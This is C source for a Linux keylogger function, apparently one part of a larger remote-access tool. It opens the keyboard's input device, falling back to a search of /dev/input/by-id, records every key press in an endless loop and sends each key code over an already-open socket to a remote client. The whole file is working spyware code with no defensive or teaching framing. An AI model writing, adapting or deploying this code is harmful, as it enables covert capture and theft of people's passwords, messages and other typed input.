#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <netdb.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include "keylogger.h"
#include <dirent.h>


void keylogger(int clientfd){
    int fd;
    char buf[128];
    char by_id[128];
    char n_dir[] = "/dev/input/by-id/";
    DIR *dir;
    struct dirent *entry;
    struct input_event ie;

    if((fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY, 0)) < 0){
        printf("ope2n error");
        //it isn't on a laptop, it might be a pc

        //search for the keyboard

        dir = opendir(n_dir);
        while ((entry = readdir(dir)) != NULL) {
            if(strstr(entry->d_name, "Keyboard-event-kbd") != NULL){
                snprintf(by_id, sizeof(by_id), "%s%s", n_dir, entry->d_name);
                if((fd = open(by_id, O_RDONLY, 0)) < 0)
                    perror("open error:");
                closedir(dir);
                break;
            }
        }
    }
    
    while (1) {
        if(read(fd, &ie, sizeof(ie)) < 0){
            perror("read error");
        }
    
        if(ie.value == 1 && ie.type == EV_KEY){
            sprintf(buf, "key pressed: %d\n", ie.code);
            if(send(clientfd, &buf, sizeof(buf), 0) < 0){
                break;
            }
        }
    }
}